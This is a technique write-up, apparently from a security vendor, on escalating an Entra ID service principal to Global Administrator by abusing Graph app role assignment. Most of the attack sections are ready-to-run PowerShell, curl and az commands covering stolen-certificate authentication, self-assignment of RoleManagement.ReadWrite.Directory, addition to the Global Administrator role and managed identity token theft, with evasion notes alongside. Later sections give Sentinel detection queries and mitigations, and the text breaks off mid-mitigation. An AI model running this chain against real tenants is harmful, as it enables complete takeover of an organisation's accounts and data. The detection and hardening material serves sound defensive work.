# [PE-ACCTMGMT-001]: App Registration Permissions Escalation

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-001 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID (Azure AD) |
| **Severity** | **Critical** – Enables silent privilege escalation to Global Administrator without user interaction |
| **CVE** | N/A |
| **Technique Status** | **ACTIVE** – Works on all current Entra ID implementations (as of January 2026) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID versions; default behavior since 2024 |
| **Patched In** | N/A (Requires mitigation; no patch exists; design-by-architecture risk) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** An attacker who has compromised or controls a service principal with `AppRoleAssignment.ReadWrite.All` permission (or roles like Application Administrator or Cloud Application Administrator) can escalate privileges silently by assigning high-privilege Graph API permissions to themselves. Specifically, by assigning `RoleManagement.ReadWrite.Directory` permission, the service principal gains the ability to add itself to the Global Administrator directory role—achieving full tenant takeover without triggering interactive approval flows, MFA challenges, or user-visible consent screens. This is a **headless privilege escalation**: it requires no user interaction and leaves minimal audit trail.

**Attack Surface:** Microsoft Graph API (`/servicePrincipals/{id}/appRoleAssignments`), Entra ID Portal (Service Principal management UI), Azure CLI/PowerShell modules.

**Business Impact:** **Complete tenant compromise.** An attacker with initial compromise of a low-privileged service principal (e.g., via leaked certificate or misconfigured Function App) can instantly elevate to Global Administrator, gaining unrestricted access to all Entra ID resources, Microsoft 365 mailboxes, SharePoint sites, Teams environments, and any integrated applications. This enables data exfiltration, ransomware deployment, user account takeovers, and persistent backdoors.

**Technical Context:** Execution is instantaneous (seconds). Detection is minimal because the attack uses only legitimate Microsoft Graph API calls and does not trigger consent dialogs or user sign-in events. The attack exploits the principle that **app-only permissions bypass the admin consent experience**—intentional by design to enable automation and service principal workflows, but creates a privilege escalation vector when combined with excessive permission assignments.

### Operational Risk

- **Execution Risk:** **Low** – Requires only Graph API connectivity and valid service principal credentials; no exploitation needed
- **Stealth:** **Very High** – No consent dialog, no user interaction, minimal audit footprint; can be chained with legitimate automation workflows
- **Reversibility:** **Partial** – Revocation of assigned permissions and role removal reverses escalation, but damage may already be done

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.3 | Ensure that Global Administrator role has no more than 2-3 permanent assignments |
| **CIS Benchmark** | 2.2.5 | Ensure application permissions are limited and monitored |
| **DISA STIG** | AZ-MS-000030 | Service principals must not have excessive permissions assigned |
| **NIST 800-53** | AC-2 (Account Management) | Accounts and associated permissions must be managed per principle of least privilege |
| **NIST 800-53** | AC-6 (Least Privilege) | Users and processes must operate with minimum required permissions |
| **GDPR** | Art. 5 (Lawfulness, Fairness, Transparency) | Processing must be lawful and transparent; unauthorized escalation violates integrity |
| **DORA** | Art. 9 (Protection and Prevention) | Access control and privilege management procedures must prevent escalation |
| **NIS2** | Art. 21 (Cyber Risk Management Measures) | Controls over privilege access and approval workflows must be enforced |
| **ISO 27001** | A.9.2.3 (Management of Privileged Access Rights) | Privileged access must be restricted and controlled through documented procedures |
| **ISO 27005** | Risk Scenario: "Compromise of Application Secrets" | Risk of unauthorized access via leaked credentials escalating to administrative privileges |

---

## 3. Technical Prerequisites

- **Required Privileges:** Compromised service principal with one of:
  - `AppRoleAssignment.ReadWrite.All` permission on Microsoft Graph, OR
  - Application Administrator role in Entra ID, OR
  - Cloud Application Administrator role, OR
  - Global Administrator (for lateral movement/backdoor creation)
  
- **Required Access:** Network access to Microsoft Graph API (`graph.microsoft.com`); valid service principal credentials (certificate, secret, or managed identity token).

**Supported Versions:**
- **Entra ID:** All versions (January 2026 and earlier)
- **Microsoft Graph API:** All versions (v1.0 and beta endpoints)
- **Azure CLI:** Version 2.30+
- **PowerShell Az Module:** Version 5.0+

**Tools:**
- [Microsoft Graph API](https://learn.microsoft.com/en-us/graph/use-the-api) (REST API)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.30+)
- [PowerShell Az Module](https://learn.microsoft.com/en-us/powershell/azure/) (Version 5.0+)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/) (Version 1.0+)
- [Managed Identity/Service Principal Authentication](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/)

---

## 5. Detailed Execution Methods and Their Steps

### METHOD 1: Direct Graph API Calls via Service Principal Certificate (Headless Escalation)

**Supported Versions:** All Entra ID versions

#### Step 1: Obtain Service Principal Credentials (Certificate or Secret)

**Objective:** Retrieve or compromise service principal credentials (certificate, secret, or managed identity token).

**Command (PowerShell - List Service Principals with Certificates):**
```powershell
# Connect to Entra ID as Global Admin (first-time reconnaissance)
Connect-MgGraph -Scopes "AppRoleAssignment.ReadWrite.All", "Application.ReadWrite.All"

# List all service principals with certificates
$servicePrincipals = Get-MgServicePrincipal -Filter "keyCredentials/any(x:x/type eq 'AsymmetricX509Cert')" -All

foreach ($sp in $servicePrincipals) {
    Write-Host "Service Principal: $($sp.DisplayName)"
    Write-Host "Object ID: $($sp.Id)"
    Write-Host "Certificates: $($sp.KeyCredentials.Count) found"
    
    # Check for excessive permissions
    $appRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id
    Write-Host "Current App Roles: $($appRoles.Count)"
    Write-Host "---"
}
```

**Expected Output:**
```
Service Principal: Function-App-Processor
Object ID: 12345678-1234-1234-1234-123456789012
Certificates: 1 found
Current App Roles: 3
---

Service Principal: DataSync-Automation
Object ID: 87654321-4321-4321-4321-210987654321
Certificates: 2 found
Current App Roles: 5
```

**What This Means:**
- Identifies service principals with certificates (credential leakage risk)
- Shows current permissions—if already high-privilege, escalation may be unnecessary
- Lists candidates for compromise

**OpSec & Evasion:**
- This reconnaissance is invisible if run from attacker-controlled service principal
- Standard administrative query; does not trigger alerts
- **Detection likelihood: Low** – Normal admin activity

**Troubleshooting:**
- **Error:** "Insufficient permissions to list service principals"
  - **Cause:** Authenticated account lacks sufficient directory roles
  - **Fix:** Use account with Application Administrator or Global Administrator role

#### Step 2: Authenticate as Compromised Service Principal

**Objective:** Establish authentication context using compromised service principal credentials.

**Command (PowerShell - Certificate-Based Authentication):**
```powershell
# Assuming certificate has been exfiltrated/leaked (e.g., from Azure Key Vault, Azure Function app storage)
$certificatePath = "C:\exfiltrated\service-principal-cert.pfx"
$certificatePassword = "password123"  # If password-protected

# Load certificate
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificatePath, $certificatePassword)

# Authenticate to Microsoft Graph as service principal
$tokenParams = @{
    Method = "POST"
    Uri    = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    Body   = @{
        client_id     = "12345678-1234-1234-1234-123456789012"  # Service principal app ID
        scope         = "https://graph.microsoft.com/.default"
        client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
        client_assertion      = (Create-JwtToken -Certificate $cert -Audience "https://login.microsoftonline.com/common/oauth2/v2.0/token")
        grant_type    = "client_credentials"
    }
}

$token = Invoke-RestMethod @tokenParams
$accessToken = $token.access_token
Write-Host "Access token obtained (valid for $($token.expires_in) seconds)"
```

**Command (Azure CLI - Certificate-Based Authentication):**
```bash
# Extract certificate and key from PFX
openssl pkcs12 -in service-principal-cert.pfx -out cert.pem -clcerts -nokeys
openssl pkcs12 -in service-principal-cert.pfx -out key.pem -nocerts -nodes

# Authenticate to Azure as service principal
az login --service-principal \
  -u "12345678-1234-1234-1234-123456789012" \
  -p key.pem \
  --cert cert.pem \
  --tenant "attacker-tenant-id"

# Verify authentication
az account show
```

**Expected Output:**
```powershell
Access token obtained (valid for 3599 seconds)
```

**What This Means:**
- Service principal has successfully authenticated to Microsoft Graph
- Access token grants full permissions assigned to the service principal
- Attacker can now make Graph API calls on behalf of the service principal

**OpSec & Evasion:**
- Certificate-based authentication is indistinguishable from legitimate app authentication
- No MFA challenge occurs; token issuance is silent
- Activity appears in Sign-in Logs but often overlooked (app-only authentication is routine)
- **Detection likelihood: Low** – Standard service principal sign-in

**Troubleshooting:**
- **Error:** "Invalid certificate or credentials"
  - **Cause:** Certificate is expired, password-protected incorrectly, or object ID mismatched
  - **Fix:** Verify certificate validity date and object ID match service principal app ID

#### Step 3: Enumerate Current Permissions and Identify Escalation Path

**Objective:** Determine current permissions and identify which additional permissions enable privilege escalation.

**Command (PowerShell - Current Permissions Enumeration):**
```powershell
# Get all app roles currently assigned to the service principal
$servicePrincipalId = "87654321-4321-4321-4321-210987654321"

$currentRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $servicePrincipalId
Write-Host "Current App Roles Assigned:"
foreach ($role in $currentRoles) {
    Write-Host "- $($role.AppRoleId): $($role.Id)"
}

# Get Microsoft Graph service principal to find available roles
$msGraphSp = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
Write-Host "Microsoft Graph Service Principal ID: $($msGraphSp.Id)"

# List all available roles in Graph API
$graphRoles = $msGraphSp.AppRoles
Write-Host "High-Risk Roles Available:"
$criticalRoles = $graphRoles | Where-Object { $_.Value -in @("RoleManagement.ReadWrite.Directory", "AppRoleAssignment.ReadWrite.All", "Application.ReadWrite.All") }
foreach ($role in $criticalRoles) {
    Write-Host "- $($role.Value) (ID: $($role.Id))"
}
```

**Expected Output:**
```
Current App Roles Assigned:
- f8d98c13-1234-1234-1234-123456789012: 12345678-1234-1234-1234-123456789012
- e3b76c45-5678-5678-5678-567890123456: 23456789-5678-5678-5678-567890123456

Microsoft Graph Service Principal ID: f06cb127-b8fb-4ee6-8034-0a3a4b51a641

High-Risk Roles Available:
- RoleManagement.ReadWrite.Directory (ID: 9e3f94ae-4ad3-4d66-a9e7-0732266c6154)
- AppRoleAssignment.ReadWrite.All (ID: 06b708a9-e830-4db3-ba6e-f2cc5924578e)
- Application.ReadWrite.All (ID: 1bfefb4e-e0b5-418b-a88f-73c46d2cc266)
```

**What This Means:**
- Service principal currently has 2 moderate-privilege roles assigned
- `RoleManagement.ReadWrite.Directory` is available and is the key to directory role escalation
- This role can be assigned without requiring admin consent or user interaction

**OpSec & Evasion:**
- Query is visible in Graph API audit logs but appears as routine permission discovery
- **Detection likelihood: Medium** – Unusual pattern if service principal shouldn't be querying roles, but blends with legitimate application management

#### Step 4: Assign High-Risk Permission (`RoleManagement.ReadWrite.Directory`)

**Objective:** Assign `RoleManagement.ReadWrite.Directory` permission to service principal, enabling directory role manipulation.

**Command (PowerShell - Assign Dangerous Permission):**
```powershell
# Service Principal IDs
$servicePrincipalId = "87654321-4321-4321-4321-210987654321"  # Attacker's service principal
$msGraphSpId = "f06cb127-b8fb-4ee6-8034-0a3a4b51a641"          # Microsoft Graph service principal

# Define the role to assign
$roleManagementRole = @{
    id = "9e3f94ae-4ad3-4d66-a9e7-0732266c6154"  # RoleManagement.ReadWrite.Directory
}

# Prepare the request body
$appRoleAssignmentParams = @{
    principalId = $servicePrincipalId
    resourceId  = $msGraphSpId
    appRoleId   = $roleManagementRole.id
}

# Assign the role via Graph API
$assignment = New-MgServicePrincipalAppRoleAssignment `
    -ServicePrincipalId $msGraphSpId `
    -BodyParameter $appRoleAssignmentParams

Write-Host "Permission assigned successfully!"
Write-Host "Assignment ID: $($assignment.Id)"
Write-Host "Now service principal has RoleManagement.ReadWrite.Directory permission"
```

**Command (Azure CLI - REST API Direct Call):**
```bash
# Set variables
SP_ID="87654321-4321-4321-4321-210987654321"
MS_GRAPH_SP_ID="f06cb127-b8fb-4ee6-8034-0a3a4b51a641"
ROLE_ID="9e3f94ae-4ad3-4d66-a9e7-0732266c6154"
ACCESS_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."

# Create the app role assignment
curl -X POST \
  "https://graph.microsoft.com/v1.0/servicePrincipals/$MS_GRAPH_SP_ID/appRoleAssignedTo" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"principalId\": \"$SP_ID\",
    \"resourceId\": \"$MS_GRAPH_SP_ID\",
    \"appRoleId\": \"$ROLE_ID\"
  }"

echo "Permission assignment submitted"
```

**Expected Output:**
```
Permission assigned successfully!
Assignment ID: d90e3f47-3e85-4e90-85cf-a0c8a3b4c9d0
Now service principal has RoleManagement.ReadWrite.Directory permission
```

**What This Means:**
- Service principal now has `RoleManagement.ReadWrite.Directory` permission
- This permission enables the service principal to add itself to any Entra ID directory role, including Global Administrator
- No separate approval or consent flow occurred

**OpSec & Evasion:**
- Assignment API call is visible in Audit Logs but appears as routine app permission management
- May not trigger alerts if organization doesn't monitor app role assignments closely
- **Detection likelihood: Medium-High** – Visible in Activity Log if audited, but often missed

**Troubleshooting:**
- **Error:** "AppRoleAssignmentParams missing required field"
  - **Cause:** Object IDs or role IDs are incorrect
  - **Fix:** Verify all IDs are correct GUIDs and match the service principals/roles

- **Error:** "Insufficient permissions to assign roles"
  - **Cause:** Authenticated service principal lacks `AppRoleAssignment.ReadWrite.All` permission
  - **Fix:** If service principal doesn't already have this, first compromise one that does

#### Step 5: Refresh Access Token (Activate New Permissions)

**Objective:** Obtain fresh access token to include newly assigned permissions in claims.

**Command (PowerShell - Refresh Token):**
```powershell
# Disconnect current session
Disconnect-MgGraph -WarningAction SilentlyContinue

# Authenticate again with fresh token
Connect-MgGraph -Certificate $cert -ClientId "12345678-1234-1234-1234-123456789012" -TenantId "attacker-tenant-id"

# Verify new permissions are in token
$context = Get-MgContext
Write-Host "Authenticated as: $($context.Account)"
Write-Host "Available Scopes: $($context.Scopes -join ', ')"
```

**Expected Output:**
```
Authenticated as: ServicePrincipal@attacker-tenant.onmicrosoft.com
Available Scopes: RoleManagement.ReadWrite.Directory, AppRoleAssignment.ReadWrite.All, ...
```

**What This Means:**
- Fresh access token now includes `RoleManagement.ReadWrite.Directory` permission
- Service principal is ready to assign itself to Global Administrator role

**OpSec & Evasion:**
- Token refresh is routine; appears as normal service principal re-authentication
- **Detection likelihood: Very Low** – Standard OAuth flow behavior

#### Step 6: Assign Service Principal to Global Administrator Directory Role

**Objective:** Escalate the service principal to Global Administrator using newly acquired permission.

**Command (PowerShell - Add to Global Administrator Role):**
```powershell
# Get the Global Administrator (Company Administrator) role definition
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

if (-not $globalAdminRole) {
    # Role might not exist yet; activate it first
    $globalAdminRoleTemplate = Get-MgDirectoryRoleTemplate -Filter "displayName eq 'Global Administrator'"
    $roleParams = @{
        templateId = $globalAdminRoleTemplate.Id
    }
    $globalAdminRole = New-MgDirectoryRole -BodyParameter $roleParams
}

# Add service principal to Global Administrator role
$memberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/servicePrincipals/$servicePrincipalId"
}

New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -BodyParameter $memberParams

Write-Host "Service principal successfully added to Global Administrator role!"
Write-Host "Privilege Escalation Complete: Service Principal is now Global Administrator"
```

**Command (Bash - REST API Direct Call):**
```bash
# Get Global Administrator role
GLOBAL_ADMIN_ROLE=$(curl -s -X GET \
  "https://graph.microsoft.com/v1.0/directoryRoles?\\$filter=displayName eq 'Global Administrator'" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[0].id')

echo "Global Admin Role ID: $GLOBAL_ADMIN_ROLE"

# Add service principal as member
curl -X POST \
  "https://graph.microsoft.com/v1.0/directoryRoles/$GLOBAL_ADMIN_ROLE/members/\$ref" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"@odata.id\": \"https://graph.microsoft.com/v1.0/servicePrincipals/$SP_ID\"
  }"

echo "Service principal added to Global Administrator role"
```

**Expected Output:**
```
Service principal successfully added to Global Administrator role!
Privilege Escalation Complete: Service Principal is now Global Administrator
```

**What This Means:**
- Service principal now has Global Administrator permissions on the Entra ID tenant
- Attacker has achieved complete tenant compromise
- All further attacks (mailbox access, Teams data exfiltration, user impersonation) are now possible

**OpSec & Evasion:**
- Role membership change appears in Audit Logs and **will** be flagged by alert systems if properly configured
- However, many organizations lack real-time monitoring of role assignments
- **Detection likelihood: High** – Activity Log shows role assignment, but detection depends on alerting infrastructure

**Troubleshooting:**
- **Error:** "Global Administrator role not found"
  - **Cause:** Role template hasn't been activated in tenant yet
  - **Fix:** Create the role first using the role template, then add member

---

### METHOD 2: Indirect Escalation via Compromised Azure Function App

**Supported Versions:** All Entra ID versions with Azure Functions support

#### Step 1: Compromise Azure Function App Managed Identity

**Objective:** Gain access to an Azure Function App's managed identity (already assigned moderate permissions).

**Command (PowerShell - Enumerate Function Apps with Managed Identities):**
```powershell
# List all Function Apps in subscription
$functionApps = Get-AzFunctionApp

foreach ($app in $functionApps) {
    Write-Host "Function App: $($app.Name)"
    Write-Host "Managed Identity: $($app.IdentityPrincipalId)"
    
    # Get current role assignments
    $assignments = Get-AzRoleAssignment -ObjectId $app.IdentityPrincipalId
    Write-Host "Current Roles: $($assignments.RoleDefinitionName -join ', ')"
    Write-Host "---"
}
```

**Expected Output:**
```
Function App: DataProcessing-Func
Managed Identity: 11111111-1111-1111-1111-111111111111
Current Roles: Contributor
---
```

**What This Means:**
- Identifies Function Apps with managed identities
- Shows existing permissions (Contributor is high-privilege and dangerous)
- Candidate for escalation abuse

#### Step 2: Authenticate as Function App Managed Identity

**Objective:** Obtain access token for Function App's managed identity.

**Command (PowerShell - Get Managed Identity Token from Function App):**
```powershell
# Inside the Function App runtime, the managed identity token can be obtained via:
$uri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://graph.microsoft.com"

$response = Invoke-WebRequest -Uri $uri -Headers @{Metadata = "true"} -UseBasicParsing
$content = $response.Content | ConvertFrom-Json
$accessToken = $content.access_token

Write-Host "Managed identity access token obtained"
```

**What This Means:**
- Access token for managed identity is obtained from Azure Instance Metadata Service
- Token grants permissions of the managed identity's role assignments
- If already has Contributor, elevation through app permissions is the next step

#### Step 3: Use Function App's Contributor Permissions to Assign Graph Permissions

**Objective:** Leverage Contributor role to assign high-risk Graph permissions to the function's service principal.

**Command (PowerShell - Escalate via Graph Permissions):**
```powershell
# From inside the Function App or with the managed identity token:
# Assign RoleManagement.ReadWrite.Directory to the function's service principal

$functionSpId = "11111111-1111-1111-1111-111111111111"
$msGraphSpId = "f06cb127-b8fb-4ee6-8034-0a3a4b51a641"
$roleId = "9e3f94ae-4ad3-4d66-a9e7-0732266c6154"  # RoleManagement.ReadWrite.Directory

$appRoleAssignmentParams = @{
    principalId = $functionSpId
    resourceId  = $msGraphSpId
    appRoleId   = $roleId
}

New-MgServicePrincipalAppRoleAssignment `
    -ServicePrincipalId $msGraphSpId `
    -BodyParameter $appRoleAssignmentParams

# Continue with Step 5 and 6 of METHOD 1 to complete escalation
```

**What This Means:**
- Function App's service principal now has `RoleManagement.ReadWrite.Directory` permission
- Same escalation path as METHOD 1 applies from this point forward

---

### METHOD 3: PowerShell One-Liner for Rapid Escalation (Post-Compromise)

**Supported Versions:** All Entra ID versions with PowerShell SDK support

**Command:**
```powershell
# Rapid escalation script (assuming service principal already authenticated)
$sp = Get-MgServicePrincipal -Filter "appId eq 'client-app-id'"
$msGraph = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"
$role = $msGraph.AppRoles | Where-Object { $_.Value -eq "RoleManagement.ReadWrite.Directory" }

# Step 1: Assign permission
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $msGraph.Id -BodyParameter @{
    principalId = $sp.Id
    resourceId  = $msGraph.Id
    appRoleId   = $role.Id
}

# Step 2: Refresh token
Disconnect-MgGraph
Connect-MgGraph -Certificate $cert -ClientId $sp.AppId -TenantId "tenant-id"

# Step 3: Escalate to Global Admin
$gaRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" | Select-Object -First 1
if (-not $gaRole) { $gaRole = New-MgDirectoryRole -BodyParameter @{templateId = (Get-MgDirectoryRoleTemplate -Filter "displayName eq 'Global Administrator'").Id} }

New-MgDirectoryRoleMember -DirectoryRoleId $gaRole.Id -BodyParameter @{ "@odata.id" = "https://graph.microsoft.com/v1.0/servicePrincipals/$($sp.Id)" }

Write-Host "✓ Privilege escalation complete. Service principal is Global Administrator."
```

**Expected Output:**
```
✓ Privilege escalation complete. Service principal is Global Administrator.
```

**What This Means:**
- Entire escalation chain executed in minimal time
- Attacker achieves Global Administrator access in < 10 seconds post-authentication

---

## 6. Atomic Red Team

**Atomic Test ID:** T1098.008 (Azure AD - adding permission to application)

**Test Name:** App Role Assignment Privilege Escalation in Entra ID

**Description:** Simulates assigning high-risk Microsoft Graph permissions to a service principal and escalating to Global Administrator role.

**Supported Versions:** All Entra ID versions

**Command:**
```powershell
# Invoke Atomic Red Team test for T1098
Invoke-AtomicTest T1098 -TestNumbers 8
```

**Cleanup Command:**
```powershell
# Remove dangerous permissions and role assignments
$sp = Get-MgServicePrincipal -Filter "appId eq 'client-app-id'"
$msGraph = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Remove app role assignments
$assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id
foreach ($assignment in $assignments) {
    Remove-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -AppRoleAssignmentId $assignment.Id
}

# Remove Global Administrator role
$gaRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
Remove-MgDirectoryRoleMember -DirectoryRoleId $gaRole.Id -DirectoryObjectId $sp.Id
```

**Reference:** [Atomic Red Team - T1098](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)

---

## 7. Tools & Commands Reference

#### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/)

**Version:** 2.0+
**Minimum Version:** 1.0
**Supported Platforms:** Windows, macOS, Linux (PowerShell Core)

**Installation:**
```powershell
Install-Module -Name Microsoft.Graph -Scope CurrentUser
Install-Module -Name Microsoft.Graph.Applications -Scope CurrentUser
```

**Usage:**
```powershell
# Connect as service principal
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("cert.pfx", "password")
Connect-MgGraph -Certificate $cert -ClientId "app-id" -TenantId "tenant-id"

# Assign permission
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id -BodyParameter $assignmentParams
```

#### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.30+
**Minimum Version:** 2.0
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

**Usage:**
```bash
az login --service-principal -u app-id -p secret --tenant tenant-id
az ad sp show --id app-id
```

---

## 8. Microsoft Sentinel Detection

#### Query 1: Suspicious App Role Assignment to RoleManagement.ReadWrite.Directory

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `InitiatedBy`, `TargetResources`, `ModifiedProperties`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time (every 5 minutes)
- **Applies To Versions:** All Entra ID versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Assign application role" or OperationName == "Update servicePrincipal"
| where TargetResources[0].displayName contains "Microsoft Graph" or tostring(parse_json(TargetResources[0].modifiedProperties)) contains "RoleManagement.ReadWrite.Directory"
| extend AssignedPermission = tostring(parse_json(TargetResources[0].modifiedProperties[0].newValue))
| where AssignedPermission in ("RoleManagement.ReadWrite.Directory", "AppRoleAssignment.ReadWrite.All", "Application.ReadWrite.All")
| extend InitiatorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend InitiatorIPAddress = tostring(InitiatedBy.user.ipAddress)
| project TimeGenerated, InitiatorUPN, InitiatorIPAddress, OperationName, AssignedPermission, TargetResources
| where InitiatorUPN !in ("admin@contoso.com", "automation-account@contoso.com")  # Exclude known legitimate accounts
```

**What This Detects:**
- Assignment of dangerous Graph API permissions to service principals
- Filters specifically for roles enabling privilege escalation
- Excludes known legitimate administrators (adjust allowlist per environment)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious App Role Assignment to RoleManagement Permissions`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run every: `5 minutes`
   - Lookup data from last: `1 hour`
5. **Incident settings:**
   - Enable **Create incidents**
6. Click **Review + create** → **Create**

#### Query 2: Service Principal Added to Global Administrator Role

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `TargetResources`, `Result`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to role" or OperationName == "Add eligible member to role"
| where TargetResources[0].displayName == "Global Administrator" or TargetResources[0].displayName == "Company Administrator"
| extend TargetObject = tostring(TargetResources[0].id)
| extend TargetType = tostring(TargetResources[0].type)
| where TargetType == "ServicePrincipal" or TargetType contains "Application"
| extend InitiatorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend InitiatorServicePrincipal = tostring(InitiatedBy.app.displayName)
| project TimeGenerated, InitiatorUPN, InitiatorServicePrincipal, OperationName, TargetObject, Result
| where Result == "success"
```

**What This Detects:**
- Service principals being added to Global Administrator role
- High-confidence indicator of privilege escalation
- Filters for successful additions only

---

## 9. Windows Event Log Monitoring

**Note:** This technique is cloud-native (Entra ID) and generates no Windows Event Log entries on on-premises systems. Monitoring occurs entirely via Azure Audit Logs (see Microsoft Sentinel section).

---

## 10. Microsoft Defender for Cloud

#### Detection Alert: Service Principal Assigned High-Risk Graph Permission

**Alert Name:** "Suspicious permission assignment to service principal detected"

- **Severity:** Critical
- **Description:** A service principal has been assigned a high-risk Microsoft Graph permission (RoleManagement.ReadWrite.Directory, AppRoleAssignment.ReadWrite.All, or Application.ReadWrite.All) that could enable privilege escalation to Global Administrator.
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:**
  1. Immediately review which service principal was assigned the permission
  2. Verify the permission is required for legitimate application functionality
  3. If unauthorized, revoke the permission: **Portal → Entra ID → App registrations → [App] → API permissions → [Permission] → Remove**
  4. Check if the service principal was subsequently added to Global Administrator role (indicate escalation completion)
  5. If evidence of escalation, initiate incident response (revoke all tokens, reset credentials)

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, enable **Defender for Identity**: ON
4. Go to **Security alerts** to view triggered alerts

---

## 11. Microsoft Purview (Unified Audit Log)

#### Query: Service Principal Permission Assignments and Role Changes

**PowerShell Command:**
```powershell
Connect-ExchangeOnline -Tenant "tenant-id"

# Search for service principal permission assignments
Search-UnifiedAuditLog -Operations "Assign application role" `
  -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -ResultSize 5000 | Where-Object { $_.AuditData -like "*RoleManagement*" } | `
  Export-Csv -Path "C:\Audits\SP_Permissions.csv"

# Search for Global Administrator role additions
Search-UnifiedAuditLog -Operations "Add member to role" `
  -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -ResultSize 5000 | Where-Object { $_.AuditData -like "*Global Administrator*" } | `
  Export-Csv -Path "C:\Audits\GlobalAdmin_Assignments.csv"
```

**Manual Configuration:**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing** (wait 24 hours)
4. Search **Audit** → **Search** → Set date range
5. Under **Activities**, select: `Assign application role`, `Add member to role`
6. Export results for analysis

---

## 12. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Restrict App Role Assignment Permissions:** Only designated identity administrators should have permission to assign app roles to service principals. Implement Azure Policy to audit/deny unauthorized assignments.

    **Manual Steps (Azure Policy - Deny Dangerous Assignments):**
    1. Go to **Azure Portal** → **Policy** → **+ Policy definition**
    2. **Name:** `Deny assignment of RoleManagement permissions to service principals`
    3. **Policy Rule:**
    ```json
    {
      "if": {
        "allOf": [
          { "field": "type", "equals": "Microsoft.Authorization/roleAssignments" },
          { "field": "Microsoft.Authorization/roleAssignments/principalType", "equals": "ServicePrincipal" },
          { "field": "Microsoft.Authorization/roleAssignments/roleDefinitionId", "contains": "/providers/Microsoft.Authorization/roleDefinitions/" }
        ]
      },
      "then": { "effect": "Deny" }
    }
    ```
    4. Assign policy to tenant scope

*   **Enable MFA for Service Principal Credential Creation:** Block creation/rotation of service principal credentials without approval workflow.

    **Manual Steps (Entra ID Policy):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods** → **Password less sign-in**
    2. Disable app password creation for users (reduces legacy attack surface)
    3. Go to **Policies** → **Authorization policies** → Restrict who can create app registrations

*   **Implement Privileged Identity Management (PIM) for Global Administrator Role:** Require approval and time-based activation; audit all assignments.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Microsoft Entra ID** → **Privileged Identity Management (PIM)**
    2. Click **Azure AD roles** → **Settings** → **Global Administrator**
    3. Configure:
       - **Activation maximum duration:** 1-4 hours
       - **Require approval:** ON
       - **Approvers:** Senior security leaders only
    4. Convert permanent Global Admin assignments to **Eligible** (require activation)

#### Priority 2: HIGH

*   **Enforce App-Only Authentication with Certificate Rotation:** Use certificates instead of secrets; rotate every 90 days; restrict certificate storage to Azure Key Vault.

    **Manual Steps (Certificate Rotation):**
